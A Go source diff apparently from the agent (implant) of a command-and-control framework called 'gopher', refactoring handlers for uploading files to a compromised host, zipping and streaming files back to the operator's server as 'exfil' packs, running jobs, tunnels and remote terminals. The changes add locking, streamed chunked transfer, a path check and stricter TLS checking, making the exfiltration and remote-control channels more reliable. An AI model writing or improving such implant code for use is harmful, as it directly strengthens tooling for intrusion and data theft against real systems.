@@ -1,6 +1,7 @@
 package main
 
 import (
+	"archive/zip"
 	"bufio"
 	"bytes"
 	"context"
@@ -16,10 +17,14 @@ import (
 	"gopher/functions"
 	"gopher/utils"
 	"io"
+	"io/fs"
 	"net"
+	"net/url"
 	"os"
 	"os/exec"
+	"path/filepath"
 	"strconv"
+	"strings"
 	"sync"
 	"syscall"
 	"time"
@@ -27,11 +32,77 @@ import (
 	"github.com/vmihailenco/msgpack/v5"
 )
 
-var UPLOADS map[string][]byte
+var UPLOADS map[string]string
 var DOWNLOADS map[string]utils.Connection
 var JOBS map[string]utils.Connection
 var TUNNELS sync.Map
 var TERMINALS sync.Map
+
+var uploadsMu sync.Mutex
+var jobsMu sync.RWMutex
+
+func uploadsTempDir() string {
+	return filepath.Join(os.TempDir(), "gopher_uploads")
+}
+
+func ensureUploadsTempDir() error {
+	return os.MkdirAll(uploadsTempDir(), 0700)
+}
+
+func uploadTempPathFor(path string) (string, error) {
+	if err := ensureUploadsTempDir(); err != nil {
+		return "", err
+	}
+	// Use a random name to avoid collisions and prevent path injection.
+	r := make([]byte, 8)
+	_, _ = rand.Read(r)
+	name := fmt.Sprintf("upload_%x.zip", r)
+	return filepath.Join(uploadsTempDir(), name), nil
+}
+
+func writeZipDirToFile(srcDir, dstZipPath string) error {
+	f, err := os.Create(dstZipPath)
+	if err != nil {
+		return err
+	}
+	defer f.Close()
+
+	zw := zip.NewWriter(f)
+	defer zw.Close()
+
+	return filepath.WalkDir(srcDir, func(path string, d fs.DirEntry, err error) error {
+		if err != nil {
+			return err
+		}
+		if d.IsDir() {
+			return nil
+		}
+		rel, err := filepath.Rel(srcDir, path)
+		if err != nil {
+			return err
+		}
+		rel = filepath.ToSlash(rel)
+		w, err := zw.Create(rel)
+		if err != nil {
+			return err
+		}
+		src, err := os.Open(path)
+		if err != nil {
+			return err
+		}
+		defer src.Close()
+		_, err = io.Copy(w, src)
+		return err
+	})
+}
+
+func tlsServerName(addr string) string {
+	host := addr
+	if u, err := url.Parse("scheme://" + addr); err == nil && u.Hostname() != "" {
+		host = u.Hostname()
+	}
+	return host
+}
 
 func TaskProcess(commands [][]byte) [][]byte {
 	var (
@@ -241,19 +312,21 @@ func taskExecBof(paramsData []byte) ([]byte, error) {
 }
 
 func taskExit() ([]byte, error) {
-	ACTIVE = false
+	active.Store(false)
 	return nil, nil
 }
 
 func taskJobList() ([]byte, error) {
 
 	var jobList []utils.JobInfo
+	jobsMu.RLock()
 	for k, v := range DOWNLOADS {
 		jobList = append(jobList, utils.JobInfo{JobId: k, JobType: v.PackType})
 	}
 	for k, v := range JOBS {
 		jobList = append(jobList, utils.JobInfo{JobId: k, JobType: v.PackType})
 	}
+	jobsMu.RUnlock()
 
 	list, _ := msgpack.Marshal(jobList)
 
@@ -267,12 +340,14 @@ func taskJobKill(paramsData []byte) ([]byte, error) {
 		return nil, err
 	}
 
+	jobsMu.RLock()
 	job, ok := DOWNLOADS[params.Id]
 	if !ok {
 		job, ok = JOBS[params.Id]
-		if !ok {
-			return nil, fmt.Errorf("job '%s' not found", params.Id)
-		}
+	}
+	jobsMu.RUnlock()
+	if !ok {
+		return nil, fmt.Errorf("job '%s' not found", params.Id)
 	}
 
 	if job.JobCancel != nil {
@@ -501,33 +576,71 @@ func taskUpload(paramsData []byte) ([]byte, error) {
 		return nil, err
 	}
 
-	uploadBytes, ok := UPLOADS[path]
+	uploadsMu.Lock()
+	tmpZipPath, ok := UPLOADS[path]
 	if !ok {
-		uploadBytes = params.Content
-	} else {
-		delete(UPLOADS, path)
-		uploadBytes = append(uploadBytes, params.Content...)
+		tmpZipPath, err = uploadTempPathFor(path)
+		if err != nil {
+			uploadsMu.Unlock()
+			return nil, err
+		}
+		UPLOADS[path] = tmpZipPath
+	}
+	uploadsMu.Unlock()
+
+	f, err := os.OpenFile(tmpZipPath, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0600)
+	if err != nil {
+		return nil, err
+	}
+	_, werr := f.Write(params.Content)
+	_ = f.Close()
+	if werr != nil {
+		return nil, werr
 	}
 
-	if params.Finish {
-		files, err := functions.UnzipBytes(uploadBytes)
-		if err != nil {
-			return nil, err
-		}
-
-		content, ok := files[params.Path]
-		if !ok {
-			return nil, errors.New("file not uploaded")
-		}
-
-		err = os.WriteFile(path, content, 0644)
-		if err != nil {
-			return nil, err
-		}
-
-	} else {
-		UPLOADS[path] = uploadBytes
+	if !params.Finish {
 		return nil, nil
+	}
+
+	// Finalize: unzip to a temp dir then move/copy the specific file to destination.
+	tmpDir, err := os.MkdirTemp("", "gopher_upload_unpack_")
+	if err != nil {
+		return nil, err
+	}
+	defer os.RemoveAll(tmpDir)
+
+	if err := functions.UnzipFile(tmpZipPath, tmpDir); err != nil {
+		return nil, err
+	}
+
+	// Best-effort cleanup of temp zip.
+	uploadsMu.Lock()
+	delete(UPLOADS, path)
+	uploadsMu.Unlock()
+	_ = os.Remove(tmpZipPath)
+
+	extracted := filepath.Clean(filepath.Join(tmpDir, params.Path))
+	if !strings.HasPrefix(extracted, tmpDir+string(os.PathSeparator)) {
+		return nil, errors.New("invalid upload path")
+	}
+
+	src, err := os.Open(extracted)
+	if err != nil {
+		return nil, err
+	}
+	defer src.Close()
+
+	dst, err := os.OpenFile(path, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
+	if err != nil {
+		return nil, err
+	}
+	_, copyErr := io.Copy(dst, src)
+	closeErr := dst.Close()
+	if copyErr != nil {
+		return nil, copyErr
+	}
+	if closeErr != nil {
+		return nil, closeErr
 	}
 
 	return msgpack.Marshal(utils.AnsUpload{Path: path})
@@ -591,22 +704,27 @@ func jobDownloadStart(paramsData []byte) ([]byte, error) {
 		return nil, err
 	}
 
-	size := info.Size() // тип int64
-
-	if size > 4*1024*1024*1024 {
-		return nil, errors.New("file too big (>4GB)")
-	}
-
-	var content []byte
+	var srcPath string
+	var cleanup func()
+	cleanup = func() {}
 	if info.IsDir() {
-		content, err = functions.ZipDirectory(path)
+		tmpZip, err := os.CreateTemp("", "gopher_download_*.zip")
+		if err != nil {
+			return nil, err
+		}
+		tmpZipPath := tmpZip.Name()
+		_ = tmpZip.Close()
+		if err := writeZipDirToFile(path, tmpZipPath); err != nil {
+			_ = os.Remove(tmpZipPath)
+			return nil, err
+		}
+		srcPath = tmpZipPath
 		path += ".zip"
+		cleanup = func() { _ = os.Remove(tmpZipPath) }
 	} else {
-		content, err = os.ReadFile(path)
+		srcPath = path
 	}
-	if err != nil {
-		return nil, err
-	}
+	defer cleanup()
 
 	var conn net.Conn
 	if profile.UseSSL {
@@ -619,9 +737,9 @@ func jobDownloadStart(paramsData []byte) ([]byte, error) {
 		caCertPool.AppendCertsFromPEM(profile.CaCert)
 
 		config := &tls.Config{
-			Certificates:       []tls.Certificate{cert},
-			RootCAs:            caCertPool,
-			InsecureSkipVerify: true,
+			Certificates: []tls.Certificate{cert},
+			RootCAs:      caCertPool,
+			ServerName:   tlsServerName(profile.Addresses[0]),
 		}
 		conn, err = tls.Dial("tcp", profile.Addresses[0], config)
 
@@ -640,23 +758,22 @@ func jobDownloadStart(paramsData []byte) ([]byte, error) {
 		Conn:     conn,
 	}
 	connection.Ctx, connection.HandleCancel = context.WithCancel(context.Background())
+	jobsMu.Lock()
 	DOWNLOADS[strFileId] = connection
+	jobsMu.Unlock()
 
 	go func() {
 		defer func() {
 			connection.HandleCancel()
 			_ = conn.Close()
+			jobsMu.Lock()
 			delete(DOWNLOADS, strFileId)
+			jobsMu.Unlock()
 		}()
 
 		exfilPack, _ := msgpack.Marshal(utils.ExfilPack{Id: uint(AgentId), Type: profile.Type, Task: params.Task})
 		exfilMsg, _ := msgpack.Marshal(utils.StartMsg{Type: utils.EXFIL_PACK, Data: exfilPack})
 		exfilMsg, _ = utils.EncryptData(exfilMsg, encKey)
-
-		job := utils.Job{
-			CommandId: utils.COMMAND_DOWNLOAD,
-			JobId:     params.Task,
-		}
 
 		/// Recv Banner
 		if profile.BannerSize > 0 {
@@ -670,42 +787,59 @@ func jobDownloadStart(paramsData []byte) ([]byte, error) {
 		_ = functions.SendMsg(conn, exfilMsg)
 
 		chunkSize := 0x100000 // 1MB
-		totalSize := len(content)
-		for i := 0; i < totalSize; i += chunkSize {
 
-			end := i + chunkSize
-			if end > totalSize {
-				end = totalSize
-			}
-			start := i == 0
-			finish := end == totalSize
+		srcFile, err := os.Open(srcPath)
+		if err != nil {
+			return
+		}
+		defer srcFile.Close()
 
+		srcInfo, err := srcFile.Stat()
+		if err != nil {
+			return
+		}
+		totalSize := int(srcInfo.Size())
+
+		buf := make([]byte, chunkSize)
+		offset := 0
+		for {
+			start := offset == 0
 			canceled := false
-
 			select {
 			case <-connection.Ctx.Done():
-				finish = true
 				canceled = true
 			default:
-				// Continue
 			}
 
-			job.Data, _ = msgpack.Marshal(utils.AnsDownload{FileId: int(FileId), Path: path, Content: content[i:end], Size: len(content), Start: start, Finish: finish, Canceled: canceled})
+			n, rerr := srcFile.Read(buf)
+			finish := false
+			if rerr == io.EOF {
+				finish = true
+			}
+			if rerr != nil && rerr != io.EOF {
+				return
+			}
+			if canceled {
+				finish = true
+			}
+
+			job := utils.Job{
+				CommandId: utils.COMMAND_DOWNLOAD,
+				JobId:     params.Task,
+			}
+			job.Data, _ = msgpack.Marshal(utils.AnsDownload{FileId: int(FileId), Path: path, Content: buf[:n], Size: totalSize, Start: start, Finish: finish, Canceled: canceled})
 			packedJob, _ := msgpack.Marshal(job)
-
-			message := utils.Message{
-				Type:   2,
-				Object: [][]byte{packedJob},
-			}
-
+			message := utils.Message{Type: 2, Object: [][]byte{packedJob}}
 			sendData, _ := msgpack.Marshal(message)
 			sendData, _ = utils.EncryptData(sendData, utils.SKey)
-			_ = functions.SendMsg(conn, sendData)
+			if err := functions.SendMsg(conn, sendData); err != nil {
+				return
+			}
 
+			offset += n
 			if finish {
 				break
 			}
-			time.Sleep(time.Millisecond * 100)
 		}
 	}()
 
@@ -762,9 +896,9 @@ func jobRun(paramsData []byte) ([]byte, error) {
 		caCertPool.AppendCertsFromPEM(profile.CaCert)
 
 		config := &tls.Config{
-			Certificates:       []tls.Certificate{cert},
-			RootCAs:            caCertPool,
-			InsecureSkipVerify: true,
+			Certificates: []tls.Certificate{cert},
+			RootCAs:      caCertPool,
+			ServerName:   tlsServerName(profile.Addresses[0]),
 		}
 		conn, err = tls.Dial("tcp", profile.Addresses[0], config)
 
@@ -782,14 +916,18 @@ func jobRun(paramsData []byte) ([]byte, error) {
 		JobCancel: procCancel,
 	}
 	connection.Ctx, connection.HandleCancel = context.WithCancel(context.Background())
+	jobsMu.Lock()
 	JOBS[params.Task] = connection
+	jobsMu.Unlock()
 
 	go func() {
 		defer func() {
 			procCancel()
 			connection.HandleCancel()
 			_ = conn.Close()
+			jobsMu.Lock()
 			delete(JOBS, params.Task)
+			jobsMu.Unlock()
 		}()
 
 		jobPack, _ := msgpack.Marshal(utils.JobPack{Id: uint(AgentId), Type: profile.Type, Task: params.Task})
@@ -955,9 +1093,9 @@ func jobTunnel(paramsData []byte) {
 			caCertPool.AppendCertsFromPEM(profile.CaCert)
 
 			config := &tls.Config{
-				Certificates:       []tls.Certificate{cert},
-				RootCAs:            caCertPool,
-				InsecureSkipVerify: true,
+				Certificates: []tls.Certificate{cert},
+				RootCAs:      caCertPool,
+				ServerName:   tlsServerName(profile.Addresses[0]),
 			}
 			srvConn, err = tls.Dial("tcp", profile.Addresses[0], config)
 
@@ -1070,9 +1208,9 @@ func jobTerminal(paramsData []byte) {
 			caCertPool.AppendCertsFromPEM(profile.CaCert)
 
 			config := &tls.Config{
-				Certificates:       []tls.Certificate{cert},
-				RootCAs:            caCertPool,
-				InsecureSkipVerify: true,
+				Certificates: []tls.Certificate{cert},
+				RootCAs:      caCertPool,
+				ServerName:   tlsServerName(profile.Addresses[0]),
 			}
 			srvConn, err = tls.Dial("tcp", profile.Addresses[0], config)
 
